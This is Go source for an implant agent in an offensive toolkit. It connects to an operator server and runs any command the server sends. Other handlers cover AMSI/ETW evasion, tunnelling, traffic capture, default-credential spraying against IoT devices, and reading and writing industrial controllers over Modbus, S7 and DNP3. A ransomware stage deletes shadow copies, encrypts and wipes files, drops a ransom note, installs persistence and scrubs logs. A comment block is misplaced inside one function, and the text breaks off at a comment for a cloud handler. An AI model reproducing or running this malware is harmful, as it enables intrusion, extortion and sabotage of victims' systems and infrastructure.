// redsky-agent — the implant.
// Phase 5: persistent connection. One TLS + ECDH handshake, then a loop that
// reads tasks, executes them, and sends results until the core closes the
// connection or sends a kill.
package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"math/big"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/sk666G/red-sky---arsenal/internal/adgo"
	"github.com/sk666G/red-sky---arsenal/internal/agentfw"
	"github.com/sk666G/red-sky---arsenal/internal/capturer"
	"github.com/sk666G/red-sky---arsenal/internal/cloudgo"
	"github.com/sk666G/red-sky---arsenal/internal/crypto"
	"github.com/sk666G/red-sky---arsenal/internal/cryptogo"
	"github.com/sk666G/red-sky---arsenal/internal/cryptor"
	"github.com/sk666G/red-sky---arsenal/internal/evade"
	"github.com/sk666G/red-sky---arsenal/internal/icsgo"
	"github.com/sk666G/red-sky---arsenal/internal/iotcreds"
	"github.com/sk666G/red-sky---arsenal/internal/proto"
	"github.com/sk666G/red-sky---arsenal/internal/shellcode"
	"github.com/sk666G/red-sky---arsenal/internal/socialgo"
	rsTLS "github.com/sk666G/red-sky---arsenal/internal/tls"
	"github.com/sk666G/red-sky---arsenal/internal/webgo"
	"github.com/sk666G/red-sky---arsenal/internal/wire"
	"github.com/sk666G/red-sky---arsenal/internal/wireless"
	"path/filepath"
)

func main() {
	host := flag.String("host", "127.0.0.1", "core host")
	port := flag.Int("port", 4444, "core port")
	tag := flag.String("tag", "", "agent tag (used to derive ID)")
	caFP := flag.String("ca-fingerprint", "", "SHA-256 fingerprint of the engagement CA (colon hex)")
	beaconSec := flag.Int("beacon", 30, "beacon interval seconds (heartbeat on the live connection)")
	reconnectSec := flag.Int("reconnect", 10, "reconnect delay after disconnect")
	flag.Parse()

	if *caFP == "" {
		log.Fatalf("no -ca-fingerprint given; get it from core's startup log")
	}

	agentID := *tag
	if agentID == "" {
		agentID = fmt.Sprintf("rs-%08x", rand.Uint32())
	}

	log.Printf("redsky-agent starting id=%s target=%s:%d", agentID, *host, *port)

	// Defense evasion: patch AMSI/ETW on Windows. No-op on Linux/macOS.
	for _, r := range evade.Init() {
		if r.Applied {
			log.Printf("evade: [ok] %s — %s", r.Name, r.Detail)
		} else {
			log.Printf("evade: [--] %s — %s", r.Name, r.Detail)
		}
	}

	for {
		if err := runSession(*host, *port, agentID, *caFP, *beaconSec); err != nil {
			log.Printf("session ended: %v", err)
		}
		time.Sleep(time.Duration(*reconnectSec) * time.Second)
	}
}

// runSession opens one connection and services it until it dies.
func runSession(host string, port int, agentID, caFP string, beaconSec int) error {
	tlsCfg, err := rsTLS.ClientTLSConfig(caFP)
	if err != nil {
		return fmt.Errorf("tls config: %w", err)
	}
	rawConn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), 10*time.Second)
	if err != nil {
		return fmt.Errorf("dial: %w", err)
	}
	defer rawConn.Close()
	conn := tls.Client(rawConn, tlsCfg)
	if err := conn.Handshake(); err != nil {
		return fmt.Errorf("tls handshake: %w", err)
	}

	// --- ECDH handshake ---
	frame, err := wire.ReadFrame(conn)
	if err != nil {
		return fmt.Errorf("read hello: %w", err)
	}
	var hello map[string]string
	if err := json.Unmarshal(frame.Payload, &hello); err != nil {
		return fmt.Errorf("bad hello: %w", err)
	}
	if hello["type"] != "ecdh_hello" {
		return fmt.Errorf("expected ecdh_hello, got %s", hello["type"])
	}
	corePub, err := base64.StdEncoding.DecodeString(hello["pubkey"])
	if err != nil {
		return fmt.Errorf("bad core pubkey: %w", err)
	}
	agentKey, err := crypto.GenerateEphemeralKey()
	if err != nil {
		return fmt.Errorf("gen key: %w", err)
	}
	reply := map[string]string{
		"type":   "ecdh_reply",
		"pubkey": base64.StdEncoding.EncodeToString(agentKey.PublicKey().Bytes()),
	}
	replyRaw, _ := json.Marshal(reply)
	if err := wire.WriteFrame(conn, 0, replyRaw); err != nil {
		return fmt.Errorf("send reply: %w", err)
	}
	key, err := crypto.DeriveKey(agentKey, corePub)
	if err != nil {
		return fmt.Errorf("derive key: %w", err)
	}
	sess, err := crypto.NewSession(key)
	if err != nil {
		return fmt.Errorf("new session: %w", err)
	}

	// --- initial beacon ---
	send := func(t proto.MessageType, payload any) error {
		sendMu.Lock()
		defer sendMu.Unlock()
		return sendEncrypted(conn, sess, t, payload)
	}
	if err := send(proto.TypeBeacon, proto.Beacon{
		AgentID: agentID,
		Info:    collectInfo(),
		TS:      time.Now().Unix(),
	}); err != nil {
		return fmt.Errorf("send beacon: %w", err)
	}

	// --- heartbeat goroutine ---
	stopBeacon := make(chan struct{})
	go func() {
		t := time.NewTicker(time.Duration(beaconSec) * time.Second)
		defer t.Stop()
		for {
			select {
			case <-stopBeacon:
				return
			case <-t.C:
				_ = send(proto.TypeBeacon, proto.Beacon{
					AgentID: agentID,
					Info:    collectInfo(),
					TS:      time.Now().Unix(),
				})
			}
		}
	}()
	defer close(stopBeacon)

	// --- task loop ---
	for {
		frame, err := wire.ReadFrame(conn)
		if err != nil {
			if err == io.EOF {
				return fmt.Errorf("core closed connection")
			}
			return fmt.Errorf("read frame: %w", err)
		}
		if frame.Flags&wire.FlagEncrypted == 0 {
			return fmt.Errorf("unexpected plaintext frame")
		}
		plain, err := sess.Decrypt(frame.Payload)
		if err != nil {
			return fmt.Errorf("decrypt: %w", err)
		}
		var env proto.Envelope
		if err := json.Unmarshal(plain, &env); err != nil {
			return fmt.Errorf("envelope: %w", err)
		}
		switch env.Type {
		case proto.TypeTask:
			var task proto.Task
			if err := json.Unmarshal(env.Payload, &task); err != nil {
				continue
			}
			log.Printf("task %s kind=%s: %s %v", task.ID, task.Kind, task.Cmd, task.Args)
			var result proto.Result
			if task.Kind == "framework" {
				result = runFrameworkTask(task)
			} else {
				result = runTask(task)
			}
			if err := send(proto.TypeResult, result); err != nil {
				return fmt.Errorf("send result: %w", err)
			}
		case proto.TypeTunnelOpen:
			var t proto.TunnelOpen
			if err := json.Unmarshal(env.Payload, &t); err != nil {
				continue
			}
			go handleTunnelOpen(conn, sess, t)
		case proto.TypeTunnelData:
			var t proto.TunnelData
			if err := json.Unmarshal(env.Payload, &t); err != nil {
				continue
			}
			routeInboundTunnelData(&t)
		case proto.TypeTunnelClose:
			var t proto.TunnelClose
			if err := json.Unmarshal(env.Payload, &t); err != nil {
				continue
			}
			closeTunnel(&t)
		case proto.TypeWirelessStart:
			var ws proto.WirelessStart
			if err := json.Unmarshal(env.Payload, &ws); err != nil {
				continue
			}
			go runWireless(conn, sess, ws)
		case proto.TypeCryptoStart:
			var cs proto.CryptoStart
			if err := json.Unmarshal(env.Payload, &cs); err != nil {
				log.Printf("[crypto] unmarshal: %v", err)
				continue
			}
			go runCrypto(conn, sess, cs)
		case proto.TypeIoTCredsStart:
			var ic proto.IoTCredsStart
			if err := json.Unmarshal(env.Payload, &ic); err != nil {
				log.Printf("[iotcreds] unmarshal: %v", err)
				continue
			}
			go runIoTCreds(conn, sess, ic)
		case proto.TypeIcsStart:
			var is proto.IcsStart
			if err := json.Unmarshal(env.Payload, &is); err != nil {
				log.Printf("[ics] unmarshal: %v", err)
				continue
			}
			go runIcs(conn, sess, is)
		case proto.TypeCloudStart:
			var cc proto.CloudStart
			if err := json.Unmarshal(env.Payload, &cc); err != nil {
				log.Printf("[cloud] unmarshal: %v", err)
				continue
			}
			go runCloud(conn, sess, cc)
		case proto.TypeCryptoOpStart:
			var co proto.CryptoOpStart
			if err := json.Unmarshal(env.Payload, &co); err != nil {
				log.Printf("[cryptoop] unmarshal: %v", err)
				continue
			}
			go runCryptoOp(conn, sess, co)
		case proto.TypeSocialStart:
			var ss proto.SocialStart
			if err := json.Unmarshal(env.Payload, &ss); err != nil {
				log.Printf("[social] unmarshal: %v", err)
				continue
			}
			go runSocial(conn, sess, ss)
		case proto.TypeWebSSRFStart:
			var ws proto.WebSSRFStart
			if err := json.Unmarshal(env.Payload, &ws); err != nil {
				log.Printf("[webssrf] unmarshal: %v", err)
				continue
			}
			go runWebSSRF(conn, sess, ws)
		case proto.TypeWebSSTIStart:
			var ws proto.WebSSTIStart
			if err := json.Unmarshal(env.Payload, &ws); err != nil {
				log.Printf("[webssti] unmarshal: %v", err)
				continue
			}
			go runWebSSTI(conn, sess, ws)
		case proto.TypeWebXXEStart:
			var wx proto.WebXXEStart
			if err := json.Unmarshal(env.Payload, &wx); err != nil {
				log.Printf("[webxxe] unmarshal: %v", err)
				continue
			}
			go runWebXXE(conn, sess, wx)
		case proto.TypeWebXSSStart:
			var wx proto.WebXSSStart
			if err := json.Unmarshal(env.Payload, &wx); err != nil {
				log.Printf("[webxss] unmarshal: %v", err)
				continue
			}
			go runWebXSS(conn, sess, wx)
		case proto.TypeAdEnumStart:
			var ae proto.AdEnumStart
			if err := json.Unmarshal(env.Payload, &ae); err != nil {
				log.Printf("[adenum] unmarshal: %v", err)
				continue
			}
			go runAdEnum(conn, sess, ae)
		case proto.TypeShellcodeStart:
			var sc proto.ShellcodeStart
			if err := json.Unmarshal(env.Payload, &sc); err != nil {
				log.Printf("[shellcode] unmarshal: %v", err)
				continue
			}
			go runShellcode(conn, sess, sc)
		case proto.TypeWirelessStop:
			var ws proto.WirelessStop
			if err := json.Unmarshal(env.Payload, &ws); err != nil {
				continue
			}
			stopWireless(ws.SessionID)
		case proto.TypeCaptureStart:
			var cs proto.CaptureStart
			if err := json.Unmarshal(env.Payload, &cs); err != nil {
				continue
			}
			go runCapture(conn, sess, cs)
		case proto.TypeCaptureStop:
			var cs proto.CaptureStop
			if err := json.Unmarshal(env.Payload, &cs); err != nil {
				continue
			}
			stopCapture(cs.SessionID)
		case proto.TypeSleep:
			var s proto.Sleep
			_ = json.Unmarshal(env.Payload, &s)
			log.Printf("sleep request %dms (not implemented in phase 5)", s.MS)
		case proto.TypeKill:
			log.Printf("kill requested, exiting")
			os.Exit(0)
		default:
			log.Printf("unknown message type: %s", env.Type)
		}
	}
}

func collectInfo() proto.AgentInfo {
	hostname, _ := os.Hostname()
	usr := "?"
	uid := -1
	if u, err := user.Current(); err == nil {
		usr = u.Username
		fmt.Sscanf(u.Uid, "%d", &uid)
	}
	return proto.AgentInfo{
		Hostname:     hostname,
		OS:           runtime.GOOS,
		Arch:         runtime.GOARCH,
		User:         usr,
		UID:          uid,
		PID:          os.Getpid(),
		Capabilities: []string{"exec", "file_get", "file_put", "tls", "aes-gcm"},
	}
}

func runTask(t proto.Task) proto.Result {
	timeout := time.Duration(t.Timeout) * time.Second
	if timeout == 0 {
		timeout = 60 * time.Second
	}
	cmd := exec.Command(t.Cmd, t.Args...)
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	done := make(chan error, 1)
	if err := cmd.Start(); err != nil {
		return proto.Result{TaskID: t.ID, Error: err.Error(), ExitCode: -1}
	}
	go func() { done <- cmd.Wait() }()
	select {
	case err := <-done:
		rc := 0
		if err != nil {
			if ee, ok := err.(*exec.ExitError); ok {
				rc = ee.ExitCode()
			} else {
				rc = -1
			}
		}
		return proto.Result{TaskID: t.ID, Stdout: stdout.String(), Stderr: stderr.String(), ExitCode: rc}
	case <-time.After(timeout):
		_ = cmd.Process.Kill()
		return proto.Result{TaskID: t.ID, Error: "timeout", ExitCode: -1}
	}
}

func sendEncrypted(conn net.Conn, sess *crypto.Session, t proto.MessageType, payload any) error {
	raw, err := json.Marshal(payload)
	if err != nil {
		return err
	}
	env := proto.Envelope{Type: t, Payload: raw}
	envBytes, err := json.Marshal(env)
	if err != nil {
		return err
	}
	enc, err := sess.Encrypt(envBytes)
	if err != nil {
		return err
	}
	return wire.WriteFrame(conn, wire.FlagEncrypted, enc)
}

// runFrameworkTask handles a Task with Kind="framework" by dispatching to
// agentfw, which runs the module natively in the agent process.
func runFrameworkTask(t proto.Task) proto.Result {
	ctx := context.Background()
	if t.Timeout > 0 {
		var cancel context.CancelFunc
		ctx, cancel = context.WithTimeout(ctx, time.Duration(t.Timeout)*time.Second)
		defer cancel()
	}
	r := agentfw.Dispatch(ctx, t.Cmd, t.Args)
	return proto.Result{
		TaskID: t.ID,
		Stdout: r.Output,
		Stderr: func() string {
			if r.Err != nil {
				return r.Err.Error()
			}
			return ""
		}(),
		ExitCode: r.ExitCode,
	}
}

// --- tunnels ---

var sendMu sync.Mutex

type agentTunnel struct {
	conn net.Conn
	done chan struct{}
}

var (
	activeTunnels   = map[string]*agentTunnel{}
	activeTunnelsMu sync.Mutex
)

func handleTunnelOpen(rwc net.Conn, sess *crypto.Session, t proto.TunnelOpen) {
	target := fmt.Sprintf("%s:%d", t.Host, t.Port)
	c, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		sendTunnelAck(rwc, sess, proto.TypeTunnelFail, proto.TunnelFail{
			TunnelID: t.TunnelID, Error: err.Error(),
		})
		return
	}
	at := &agentTunnel{conn: c, done: make(chan struct{})}
	activeTunnelsMu.Lock()
	activeTunnels[t.TunnelID] = at
	activeTunnelsMu.Unlock()

	log.Printf("tunnel %s -> %s", t.TunnelID, target)
	sendTunnelAck(rwc, sess, proto.TypeTunnelReady, proto.TunnelReady{TunnelID: t.TunnelID})

	// read from target -> send tunnel_data to core
	go func() {
		defer func() {
			activeTunnelsMu.Lock()
			delete(activeTunnels, t.TunnelID)
			activeTunnelsMu.Unlock()
			c.Close()
		}()
		buf := make([]byte, 16*1024)
		for {
			n, err := c.Read(buf)
			if n > 0 {
				sendTunnelAck(rwc, sess, proto.TypeTunnelData, proto.TunnelData{
					TunnelID: t.TunnelID, Data: buf[:n],
				})
			}
			if err != nil {
				sendTunnelAck(rwc, sess, proto.TypeTunnelData, proto.TunnelData{
					TunnelID: t.TunnelID, EOF: true,
				})
				return
			}
		}
	}()
}

func routeInboundTunnelData(t *proto.TunnelData) {
	activeTunnelsMu.Lock()
	at := activeTunnels[t.TunnelID]
	activeTunnelsMu.Unlock()
	if at == nil {
		return
	}
	if len(t.Data) > 0 {
		_, _ = at.conn.Write(t.Data)
	}
	if t.EOF {
		at.conn.Close()
	}
}

func closeTunnel(t *proto.TunnelClose) {
	activeTunnelsMu.Lock()
	at := activeTunnels[t.TunnelID]
	delete(activeTunnels, t.TunnelID)
	activeTunnelsMu.Unlock()
	if at != nil {
		at.conn.Close()
	}
}

func sendTunnelAck(conn net.Conn, sess *crypto.Session, t proto.MessageType, payload any) {
	sendMu.Lock()
	defer sendMu.Unlock()
	_ = sendEncrypted(conn, sess, t, payload)
}

// --- capture ---

var (
	activeCaptures   = map[string]context.CancelFunc{}
	activeCapturesMu sync.Mutex
)

func runCapture(conn net.Conn, sess *crypto.Session, cs proto.CaptureStart) {
	_ = context.Background()
	ctx, cancel := context.WithCancel(context.Background())
	_ = ctx
	activeCapturesMu.Lock()
	activeCaptures[cs.SessionID] = cancel
	activeCapturesMu.Unlock()
	defer func() {
		activeCapturesMu.Lock()
		delete(activeCaptures, cs.SessionID)
		activeCapturesMu.Unlock()
		cancel()
	}()

	// chunky encode: serialize frames into pcap record format on the fly and
	// ship them in 64KB data messages.
	var chunk []byte
	var chunkCount int
	const chunkMax = 60 * 1024

	flushChunk := func() {
		if len(chunk) == 0 {
			return
		}
		sendTunnelAck(conn, sess, proto.TypeCaptureData, proto.CaptureData{
			SessionID: cs.SessionID,
			Data:      chunk,
			Count:     chunkCount,
		})
		chunk = nil
		chunkCount = 0
	}

	// no per-frame pcap global header here — the core writes that on its side
	timeout := 30 * time.Second
	err := capturer.Capture(ctx, capturer.Options{
		Iface:   cs.Iface,
		Snaplen: cs.Snaplen,
		Timeout: timeout,
	}, func(f capturer.Frame) {
		// encode one record: 16-byte header + payload
		var rh [16]byte
		binary.LittleEndian.PutUint32(rh[0:4], uint32(f.TS.Unix()))
		binary.LittleEndian.PutUint32(rh[4:8], uint32(f.TS.Nanosecond()/1000))
		binary.LittleEndian.PutUint32(rh[8:12], uint32(len(f.Data)))
		binary.LittleEndian.PutUint32(rh[12:16], uint32(f.OrigLen))
		chunk = append(chunk, rh[:]...)
		chunk = append(chunk, f.Data...)
		chunkCount++
		if len(chunk) >= chunkMax {
			flushChunk()
		}
	})
	flushChunk()

	if err != nil {
		sendTunnelAck(conn, sess, proto.TypeCaptureFail, proto.CaptureFail{
			SessionID: cs.SessionID, Error: err.Error(),
		})
		return
	}
	sendTunnelAck(conn, sess, proto.TypeCaptureDone, proto.CaptureDone{
		SessionID: cs.SessionID,
	})
}

func stopCapture(sessionID string) {
	activeCapturesMu.Lock()
	cancel, ok := activeCaptures[sessionID]
	activeCapturesMu.Unlock()
	if ok && cancel != nil {
		cancel()
	}
}

// --- wireless capture ---

var (
	activeWireless   = map[string]context.CancelFunc{}
	activeWirelessMu sync.Mutex
)

func runWireless(conn net.Conn, sess *crypto.Session, ws proto.WirelessStart) {
	ctx, cancel := context.WithCancel(context.Background())
	activeWirelessMu.Lock()
	activeWireless[ws.SessionID] = cancel
	activeWirelessMu.Unlock()
	defer func() {
		activeWirelessMu.Lock()
		delete(activeWireless, ws.SessionID)
		activeWirelessMu.Unlock()
		cancel()
	}()

	var chunk []byte
	var chunkCount int
	const chunkMax = 60 * 1024

	flush := func() {
		if len(chunk) == 0 {
			return
		}
		sendTunnelAck(conn, sess, proto.TypeWirelessData, proto.WirelessData{
			SessionID: ws.SessionID,
			Data:      chunk,
			Count:     chunkCount,
		})
		chunk = nil
		chunkCount = 0
	}

	err := wireless.Capture(ctx, wireless.Options{
		Iface:   ws.Iface,
		Channel: ws.Channel,
		Timeout: 30 * time.Second,
	}, func(f wireless.Frame) {
		// record framing: 8-byte ts_ns BE + 4-byte len BE + payload
		hdr := make([]byte, 12)
		ns := uint64(f.TS.UnixNano())
		for i := 0; i < 8; i++ {
			hdr[7-i] = byte(ns >> (8 * i))
		}
		ln := uint32(len(f.Data))
		hdr[8] = byte(ln >> 24)
		hdr[9] = byte(ln >> 16)
		hdr[10] = byte(ln >> 8)
		hdr[11] = byte(ln)
		chunk = append(chunk, hdr...)
		chunk = append(chunk, f.Data...)
		chunkCount++
		if len(chunk) >= chunkMax {
			flush()
		}
	})
	flush()

	if err != nil {
		sendTunnelAck(conn, sess, proto.TypeWirelessFail, proto.WirelessFail{
			SessionID: ws.SessionID, Error: err.Error(),
		})
		return
	}
	sendTunnelAck(conn, sess, proto.TypeWirelessDone, proto.WirelessDone{
		SessionID: ws.SessionID,
	})
}

func stopWireless(sessionID string) {
	activeWirelessMu.Lock()
	cancel, ok := activeWireless[sessionID]
	activeWirelessMu.Unlock()
	if ok && cancel != nil {
		cancel()
	}

	// runCrypto drives the crypto_malware stage on the agent. Mirrors runWireless:
	// owns its own goroutine, sends progress over the tunnel, returns on completion.
	//
	// Stage order:
	//  1. KillVSS  — destroy VSS / snapshots if requested
	//  2. Walk     — encrypt every target file under Root
	//  3. Note     — drop the ransom note in hit directories
	//
	// The agent needs an operator public key already on disk at
	// <workdir>/operator.pub.pem — it is fetched over the tunnel before this
	// handler is invoked by a KeyPush message.
}

func runCrypto(conn net.Conn, sess *crypto.Session, cs proto.CryptoStart) {
	_, cancel := context.WithCancel(context.Background())
	activeCryptoMu.Lock()
	activeCrypto[cs.SessionID] = cancel
	activeCryptoMu.Unlock()
	defer func() {
		activeCryptoMu.Lock()
		delete(activeCrypto, cs.SessionID)
		activeCryptoMu.Unlock()
		cancel()
	}()

	send := func(stage, path string, done, total, bytes int64, ok bool, errStr string) {
		sendTunnelAck(conn, sess, proto.TypeCryptoData, proto.CryptoData{
			SessionID: cs.SessionID,
			Stage:     stage,
			Path:      path,
			Done:      done,
			Total:     total,
			Bytes:     bytes,
			OK:        ok,
			Error:     errStr,
		})
	}

	// load operator public key
	workdir := os.Getenv("REDSKY_WORKDIR")
	if workdir == "" {
		workdir = "."
	}
	pubPath := filepath.Join(workdir, "operator.pub.pem")
	pubPEM, err := os.ReadFile(pubPath)
	if err != nil {
		send("error", "", 0, 0, 0, false, "operator.pub.pem not found: "+err.Error())
		return
	}
	pub, err := cryptor.LoadPublicKey(pubPEM)
	if err != nil {
		send("error", "", 0, 0, 0, false, "load pub: "+err.Error())
		return
	}

	// Stage 1 — shadow destruction
	if cs.KillVSS {
		send("shadow", "", 0, 0, 0, true, "")
		shr := cryptor.DestroySnapshots(cryptor.ShadowOptions{DryRun: cs.DryRun})
		for _, c := range shr.Commands {
			send("shadow", c.Cmd, 0, 0, 0, c.OK || c.Skipped, c.Err)
		}
	}

	// Stage 2 — walk + encrypt. Dry-run just enumerates.
	var (
		count int64
		bytes int64
	)
	opts := cryptor.WalkerOptions{
		Root:     cs.Root,
		DryRun:   cs.DryRun,
		WipeOrig: !cs.DryRun,
		OnHit: func(path string, size int64) {
			count++
			// throttle: only report every 64 files to avoid flooding the tunnel
			if count%64 == 0 || count < 16 {
				send("walk", path, count, 0, bytes, true, "")
			}
		},
		OnDone: func(path string, ok bool, err error) {
			if !ok {
				errStr := ""
				if err != nil {
					errStr = err.Error()
				}
				send("encrypt", path, 0, 0, 0, false, errStr)
				return
			}
			// size not directly available here — rely on OnHit for bytes
		},
	}
	stats, err := cryptor.Walk(opts, pub, cs.KeyID)
	if err != nil {
		send("error", "", 0, 0, 0, false, "walk: "+err.Error())
		return
	}
	bytes = stats.BytesIn
	send("encrypt", "", stats.Encrypted, stats.Found, bytes, true, "")

	// Stage 3 — note
	if cs.Note && !cs.DryRun {
		nr, err := cryptor.DropNote(cryptor.NoteOptions{
			Root:         cs.Root,
			ContactEmail: cs.ContactEmail,
			Address:      cs.Address,
			Price:        cs.Price,
			VictimID:     cs.VictimID,
		})
		if err != nil {
			send("note", "", 0, 0, 0, false, err.Error())
		} else {
			send("note", nr.RootNote, int64(nr.Written), int64(nr.DirCount), 0, true, "")
		}
	}

	// Poststage
	if cs.PostPersist {
		send("persist", "", 0, 0, 0, true, "")
		pr, err := cryptor.Install(cryptor.PersistOptions{
			Name:       cs.PersistName,
			OnBoot:     cs.PersistOnBoot,
			OnLogon:    !cs.PersistOnBoot,
			BinaryPath: os.Args[0],
			Args:       []string{"-core", fmt.Sprintf("%s:%d", "", 4444)},
			DryRun:     cs.DryRun,
		})
		if err != nil {
			send("persist", pr.Method, 0, 0, 0, false, err.Error())
		} else {
			send("persist", pr.Method, 0, 0, 0, pr.OK, pr.Path+" "+pr.Cmd)
		}
	}
	if cs.PostWallpaper && cs.WallpaperPath != "" {
		send("wallpaper", "", 0, 0, 0, true, "")
		wr, err := cryptor.SetWallpaper(cryptor.WallpaperOptions{
			ImagePath: cs.WallpaperPath,
			DryRun:    cs.DryRun,
		})
		if err != nil {
			send("wallpaper", wr.Method, 0, 0, 0, false, err.Error())
		} else {
			send("wallpaper", wr.Method, 0, 0, 0, wr.OK, wr.Cmd)
		}
	}
	if cs.PostLogScrub {
		send("logscrub", "", 0, 0, 0, true, "")
		for _, lr := range cryptor.ScrubLogs(cryptor.LogScrubOptions{DryRun: cs.DryRun}) {
			send("logscrub", lr.Target, 0, 0, 0, lr.OK, lr.Method+" "+lr.Err)
		}
	}

	send("done", "", stats.Encrypted, stats.Found, bytes, true, "")
}

var (
	activeCryptoMu sync.Mutex
	activeCrypto   = map[string]context.CancelFunc{}
)

// runIoTCreds drives a default-credential spray on the agent. Streams
// every attempt back over the tunnel — hits flagged OK, misses flagged !OK.
// Called via proto.TypeIoTCredsStart.
func runIoTCreds(conn net.Conn, sess *crypto.Session, ic proto.IoTCredsStart) {
	send := func(hit iotcreds.Hit, idx, total int, ok, done bool, errStr string) {
		sendTunnelAck(conn, sess, proto.TypeIoTCredsData, proto.IoTCredsData{
			SessionID: ic.SessionID,
			Index:     idx,
			Total:     total,
			Vendor:    hit.Vendor,
			User:      hit.User,
			Pass:      hit.Pass,
			OK:        ok,
			Done:      done,
			Error:     errStr,
		})
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	activeCryptoMu.Lock()
	activeCrypto[ic.SessionID] = cancel
	activeCryptoMu.Unlock()
	defer func() {
		activeCryptoMu.Lock()
		delete(activeCrypto, ic.SessionID)
		activeCryptoMu.Unlock()
	}()

	total := iotcreds.Count()
	var hitCount int
	onAttempt := func(i int, c iotcreds.Cred, ok bool) {
		if ok {
			hitCount++
			send(iotcreds.Hit{Vendor: c.Vendor, User: c.User, Pass: c.Pass}, i, total, true, false, "")
		} else if i%8 == 0 {
			// throttle misses — every 8th attempt to keep tunnel chatter down
			send(iotcreds.Hit{Vendor: c.Vendor, User: c.User, Pass: c.Pass}, i, total, false, false, "")
		}
	}

	hits, err := iotcreds.Spray(ctx, iotcreds.SprayOptions{
		Host:      ic.Host,
		Port:      ic.Port,
		Protocol:  ic.Protocol,
		Path:      ic.Path,
		Timeout:   ic.Timeout,
		StopFirst: ic.StopFirst,
	}, onAttempt)

	errStr := ""
	if err != nil {
		errStr = err.Error()
	}
	send(iotcreds.Hit{}, total, total, len(hits) > 0, true, errStr)
}

// runIcs drives an ICS protocol operation on the agent. Dispatches by
// Protocol to the appropriate icsgo primitive and streams progress via
// IcsData messages. Called via proto.TypeIcsStart.
func runIcs(conn net.Conn, sess *crypto.Session, ic proto.IcsStart) {
	send := func(stage, msg, detail string, ok, done bool) {
		sendTunnelAck(conn, sess, proto.TypeIcsData, proto.IcsData{
			SessionID: ic.SessionID,
			Stage:     stage,
			Message:   msg,
			Detail:    detail,
			OK:        ok,
			Done:      done,
		})
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	activeCryptoMu.Lock()
	activeCrypto[ic.SessionID] = cancel
	activeCryptoMu.Unlock()
	defer func() {
		activeCryptoMu.Lock()
		delete(activeCrypto, ic.SessionID)
		activeCryptoMu.Unlock()
	}()

	switch ic.Protocol {
	case "modbus":
		runIcsModbus(ctx, ic, send)
	case "s7":
		runIcsS7(ctx, ic, send)
	case "dnp3":
		runIcsDNP3(ctx, ic, send)
	case "bacnet":
		runIcsBACnet(ctx, ic, send)
	case "enip":
		runIcsENIP(ctx, ic, send)
	case "opcua":
		runIcsOPCUA(ctx, ic, send)
	default:
		send("error", "unknown protocol: "+ic.Protocol, "", false, true)
		return
	}
	send("done", "", "", true, true)
}

func runIcsModbus(ctx context.Context, ic proto.IcsStart, send func(string, string, string, bool, bool)) {
	opts := icsgo.MBOptions{Host: ic.Host, Port: ic.Port, Unit: ic.Unit}
	switch ic.Action {
	case "scan":
		alive, err := icsgo.ModbusUnitScan(ic.Host, ic.Port, 1, 247, 0)
		if err != nil {
			send("scan", "scan error", err.Error(), false, false)
			return
		}
		send("scan", "units responding", fmt.Sprintf("%v", alive), true, false)
	case "read":
		res, err := icsgo.ModbusRead(opts, ic.Func, ic.Start, ic.Count)
		if err != nil {
			send("read", "read error", err.Error(), false, false)
			return
		}
		if res.Exception != 0 {
			send("read", "exception", fmt.Sprintf("code 0x%02x", res.Exception), false, false)
			return
		}
		det := fmt.Sprintf("regs=%v bits=%v", res.Regs, res.Bits)
		send("read", "ok", det, true, false)
	case "write":
		switch ic.Func {
		case icsgo.MBFuncWriteCoil:
			res, err := icsgo.ModbusWriteCoil(opts, ic.Start, ic.Bool)
			if err != nil {
				send("write", "coil write error", err.Error(), false, false)
				return
			}
			send("write", "coil ok", fmt.Sprintf("exc=%d", res.Exception), res.Exception == 0, false)
		case icsgo.MBFuncWriteRegister:
			res, err := icsgo.ModbusWriteRegister(opts, ic.Start, ic.Value)
			if err != nil {
				send("write", "reg write error", err.Error(), false, false)
				return
			}
			send("write", "reg ok", fmt.Sprintf("exc=%d", res.Exception), res.Exception == 0, false)
		case icsgo.MBFuncWriteMultiRegs:
			res, err := icsgo.ModbusWriteMultiRegs(opts, ic.Start, ic.Values)
			if err != nil {
				send("write", "multi write error", err.Error(), false, false)
				return
			}
			send("write", "multi ok", fmt.Sprintf("exc=%d", res.Exception), res.Exception == 0, false)
		}
	}
}

func runIcsS7(ctx context.Context, ic proto.IcsStart, send func(string, string, string, bool, bool)) {
	c, err := icsgo.S7Connect(icsgo.S7Options{Host: ic.Host, Port: ic.Port})
	if err != nil {
		send("connect", "s7 connect error", err.Error(), false, false)
		return
	}
	defer c.Close()

	switch ic.Action {
	case "info":
		data, err := c.S7ReadSZL(0x001C)
		if err != nil {
			send("info", "szl 0x1C error", err.Error(), false, false)
			return
		}
		send("info", "component id", string(data[:min(len(data), 200)]), true, false)
	case "read":
		data, err := c.S7Read(ic.Area, ic.DB, ic.Start, ic.Count)
		if err != nil {
			send("read", "read error", err.Error(), false, false)
			return
		}
		send("read", fmt.Sprintf("%d bytes", len(data)), fmt.Sprintf("%x", data), true, false)
	case "write":
		if err := c.S7Write(ic.Area, ic.DB, ic.Start, ic.Data); err != nil {
			send("write", "write error", err.Error(), false, false)
			return
		}
		send("write", "ok", "", true, false)
	}
}

func runIcsDNP3(ctx context.Context, ic proto.IcsStart, send func(string, string, string, bool, bool)) {
	c, err := icsgo.DNP3Connect(icsgo.DNP3Options{
		Host: ic.Host, Port: ic.Port, Dest: ic.Dest, Src: ic.Src,
	})
	if err != nil {
		send("connect", "dnp3 connect error", err.Error(), false, false)
		return
	}
	defer c.Close()

	var resp icsgo.DNP3Response
	switch ic.Action {
	case "integrity":
		resp, err = c.Integrity()
	case "poll":
		resp, err = c.PollClass(ic.Class)
	default:
		send("error", "unknown dnp3 action: "+ic.Action, "", false, false)
		return
	}
	if err != nil {
		send("read", "dnp3 error", err.Error(), false, false)
		return
	}
	det := fmt.Sprintf("fn=0x%02x iin=0x%04x raw=%x", resp.Function, resp.IIN.Raw, resp.Raw)
	send("read", "ok", det, true, false)
}

// runCloud drives a cloud-provider operation on the agent. Dispatches by
// Action to the appropriate cloudgo primitive, streams CloudData.
